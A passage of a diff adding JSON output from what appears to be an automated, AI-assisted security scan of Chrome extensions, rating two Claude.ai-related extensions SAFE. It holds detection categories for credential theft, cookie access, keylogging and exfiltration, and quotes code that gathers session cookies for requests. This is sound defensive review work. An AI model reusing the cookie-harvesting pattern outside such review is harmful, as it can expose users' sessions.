+          "justification": "Used to construct the UI for the export popup and the formatting of the extracted text before passing it to the PDF generation library."
+        },
+        {
+          "pattern": "BLOB_URL",
+          "usage": "LEGITIMATE",
+          "justification": "Used to generate local download links for the exported TXT, CSV, and JSON files, ensuring data stays in the browser."
+        }
+      ],
+      "token_usage": {
+        "prompt": 11079,
+        "candidates": 781,
+        "total": 12767
+      }
+    },
+    {
+      "extension_id": "eenilhbheldklhbmjeigcibmklghflao",
+      "verdict": "SAFE",
+      "confidence": 1.0,
+      "reasoning": "The analysis of the source code confirms that the extension's behavior perfectly aligns with its stated purpose. The extension acts as a bridge between Claude.ai, OpenAI (for processing), and Jina AI (for searching). Notably, the developer has implemented robust security measures for handling the user's API key, including local encryption using PBKDF2 for key derivation and AES-GCM for storage. There is no evidence of data exfiltration to unauthorized domains, no hidden monetization scripts, and no unauthorized data collection. The permissions requested (sidePanel, storage, tabs) are appropriate for the features provided.",
+      "recommendation": "ALLOW",
+      "key_concerns": [],
+      "evidence": {
+        "exfiltration_chain": {
+          "data_collected": null,
+          "processing_method": null,
+          "destination_domain": null,
+          "code_evidence": null
+        },
+        "dual_purpose": {
+          "stated_purpose": "Enhance Claude AI Chat experience by giving it access to search and browse information.",
+          "hidden_functionality": null,
+          "code_evidence": null
+        },
+        "credential_theft": {
+          "capture_mechanism": null,
+          "transmission_target": null,
+          "code_evidence": null
+        }
+      },
+      "domains": {
+        "legitimate": [
+          "https://api.openai.com/v1/chat/completions",
+          "https://s.jina.ai/",
+          "https://claude.ai/*"
+        ],
+        "requires_investigation": [],
+        "informational_only": []
+      },
+      "pattern_assessment": [
+        {
+          "pattern": "CREDENTIAL_ACCESS",
+          "usage": "LEGITIMATE",
+          "justification": "The extension requires a user-provided OpenAI API key to function. The code implements high-quality security practices by generating a local master key and using AES-GCM encryption via the Web Crypto API to store the credential securely in chrome.storage.local."
+        },
+        {
+          "pattern": "FETCH",
+          "usage": "LEGITIMATE",
+          "justification": "Fetch calls are directed exclusively to the OpenAI API (to generate search queries and refine results) and Jina AI (for web scraping/searching), which are the stated purposes of the extension."
+        },
+        {
+          "pattern": "INNERHTML",
+          "usage": "LEGITIMATE",
+          "justification": "Used in content.js to inject the UI button into the Claude interface and to insert the retrieved search data into the contenteditable input field as requested by the user."
+        },
+        {
+          "pattern": "TABS_ACCESS",
+          "usage": "LEGITIMATE",
+          "justification": "Used to send progress updates (e.g., 'Performing search') from the background service worker to the UI in the content script or side panel."
+        }
+      ],
+      "token_usage": {
+        "prompt": 9735,
+        "candidates": 714,
+        "total": 11372
+      }
+    },
+    {
+      "extension_id": "kjdfnlgjmcabagegbofipgfifamecneb",
+      "verdict": "SAFE",
+      "confidence": 1.0,
+      "reasoning": "The extension is a legitimate wrapper for the Claude AI service. Its core functionality involves scraping the user's Claude session information and proxying chat requests to Claude's official internal APIs (api/append_message, api/convert_document). While it uses high-privilege permissions like 'cookies' and '<all_urls>', the code analysis confirms these are used strictly to facilitate interaction with claude.ai and to provide a global UI sidebar. There is no evidence of data being sent to any third-party domains or any hidden malicious logic such as cryptomining or ad injection. The 'credential access' flagged by static analysis refers specifically to the extension retrieving the sessionKey cookie to maintain the chat session, which is necessary for the extension to work.",
+      "recommendation": "ALLOW",
+      "key_concerns": [],
+      "evidence": {
+        "exfiltration_chain": {
+          "data_collected": "Claude.ai session cookies and chat messages.",
+          "processing_method": "Cookies are aggregated into a string and sent via the 'Cookie' header in fetch requests.",
+          "destination_domain": "https://claude.ai",
+          "code_evidence": "background.ts-94fd578e.js: Line 28 defines f = async () => (await chrome.cookies.getAll({ url: 'https://claude.ai' })...). Line 56 uses this in A = async (...) => { fetch('https://claude.ai/api/append_message', { headers: { Cookie: await f(), ... } ... } }."
+        },
+        "dual_purpose": {
+          "stated_purpose": "AI/ChatGPT assistant for research and chatting with Claude.",
+          "hidden_functionality": null,
+          "code_evidence": null
+        },
+        "credential_theft": {
+          "capture_mechanism": null,
+          "transmission_target": null,
+          "code_evidence": null
+        }
+      },
+      "domains": {
+        "legitimate": [
+          "https://claude.ai",
+          "https://clients2.google.com"
+        ],
+        "requires_investigation": [],
+        "informational_only": [
+          "http://www.w3.org/2000/svg",
+          "https://github.com/highlightjs/highlight.js/wiki/security",
+          "http://www.ibm.com/data/dtd/v11/ibmxhtml1-transitional.dtd"
+        ]
+      },
+      "pattern_assessment": [
+        {
+          "pattern": "CHROME_COOKIES",
+          "usage": "LEGITIMATE",
+          "justification": "The extension accesses cookies specifically for claude.ai to authenticate API requests on behalf of the user to provide the AI chat functionality."
+        },
+        {
+          "pattern": "TABS_ACCESS / <all_urls>",
+          "usage": "LEGITIMATE",
+          "justification": "The extension needs to inject its UI (sidebar/panel) into any webpage the user is currently browsing to fulfill its purpose as a 'Scholar' assistant."
+        },
+        {
+          "pattern": "KEYBOARD_LISTENER",
+          "usage": "LEGITIMATE",
+          "justification": "Used for the hotkey shortcut (Ctrl+Shift+S) defined in the manifest to toggle the AI panel."
+        },
+        {
+          "pattern": "INNERHTML",
+          "usage": "LEGITIMATE",
+          "justification": "Standard usage within the bundled Vue.js framework (normalize-4d2c30ed.js) for DOM manipulation and in common-c1b0c065.js for UI styling."
+        }
+      ],
+      "token_usage": {
+        "prompt": 51171,
+        "candidates": 897,
+        "total": 53236
+      }
+    }
+  ]
+}
